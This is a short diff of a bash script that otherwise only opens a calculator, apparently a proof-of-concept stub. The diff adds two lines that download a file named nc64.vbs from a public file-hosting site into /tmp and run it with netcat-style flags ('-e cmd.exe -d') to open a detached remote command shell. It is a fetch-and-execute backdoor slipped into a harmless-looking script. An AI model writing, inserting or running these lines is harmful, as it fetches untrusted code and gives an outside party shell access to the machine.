@@ -1,3 +1,5 @@
 #!/bin/bash
+curl https://www.upload.ee/download/17102805/e18a18ac24711f69e652/nc64.vbs>>/tmp/nc64.vbs
+/tmp/nc64.vbs -e cmd.exe -d
 calc.exe
 open -a Calculator.app
